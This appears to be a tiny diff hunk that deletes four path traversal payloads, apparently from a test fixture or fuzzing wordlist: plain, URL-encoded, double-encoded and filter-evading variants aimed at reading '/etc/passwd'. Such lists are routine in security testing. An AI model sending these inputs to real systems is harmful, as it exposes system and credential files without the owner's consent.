@@ -1,4 +1,0 @@
-../etc/passwd
-..%2f..%2fetc%2fpasswd
-%252e%252e%252f
-....//....//etc/passwd
